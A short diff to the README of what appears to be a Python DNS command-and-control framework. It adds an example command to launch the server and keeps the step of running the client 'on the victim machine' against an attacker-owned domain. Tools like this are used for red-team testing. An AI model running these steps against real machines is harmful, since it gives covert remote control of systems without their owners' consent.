@@ -8,7 +8,7 @@ A plain-as-possible DNS C2 framework with both client and server written in Pyth
 Configure a DNS record (like, with a legit registrar) with an NS record that points to a public asset you control. Example:
 `odc2.SomeDomainIOwn.com`, pointing to `myVPC.SomeDomainIOwn.com`.
 
-On that VPC, install and run the server.
+On that VPC, install and run the server, e.g., `sudo python3 odc2server.py odc2.SomeDomainIOwn.com`
 
 On the victim machine, run `odc2client.py -d odc2.SomeDomainIOwn.com`
 
